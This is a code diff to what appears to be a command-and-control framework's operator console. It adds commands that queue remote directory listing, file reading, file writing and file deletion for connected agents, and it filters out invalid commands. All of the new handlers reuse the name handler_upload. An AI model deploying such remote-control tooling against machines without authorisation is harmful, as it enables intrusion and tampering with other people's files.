@@ -141,6 +141,41 @@ def handler_upload(local_path, remote_path, command_dict):
     command_dict["dst"] = remote_path
     return command_dict
 
+@register_command("listdir", "List a directory (R for recurse)", "File Stuff", "All", ["<path>", "<R|0>"])
+def handler_upload(path, is_recurse, command_dict):
+    command_dict["path"] = path
+    if is_recurse == "R":
+        command_dict["rec"] = True
+    elif is_recurse == "0":
+        command_dict["rec"] = False
+    else:
+        utils.log_message("Use R or 0 (for recurse flag)", print_time=False)
+        return False
+    return command_dict
+
+@register_command("fread", "Read a file", "File Stuff", "All", ["<path>"])
+def handler_upload(path, command_dict):
+    command_dict["path"] = path
+    return command_dict
+
+@register_command("fwrite", "Write/Append a file", "File Stuff", "All", ["<path>", "<W|A>", "<content>"])
+def handler_upload(path, mode, content, command_dict):
+    command_dict["path"] = path
+    command_dict["content"] = content
+    if mode == "W":
+        command_dict["append"] = False
+    elif mode == "A":
+        command_dict["append"] = True
+    else:
+        utils.log_message("Use W or A (for write or append)", print_time=False)
+        return False
+    return command_dict 
+
+@register_command("fdelete", "Delete a file", "File Stuff", "All", ["<path>"])
+def handler_upload(path, command_dict):
+    command_dict["path"] = path
+    return command_dict
+
 @register_command("regenumkeys", "Enum Registry subkeys", "Registry Stuff", "Windows", ["<key-path>"])
 def handler_regenumkeys(reg_key, command_dict):
     command_dict["key"] = reg_key
@@ -550,7 +585,8 @@ def agent_screen(agent_id, os):
             command = command_registry.get(command_type)
             if command:
                 command_dict = command.handler(*command_list[1:])
-                listener.agents[agent_id]["pending_commands"] += [command_dict]
+                if command_dict:
+                    listener.agents[agent_id]["pending_commands"] += [command_dict]
             else:
                 raise Exception
 
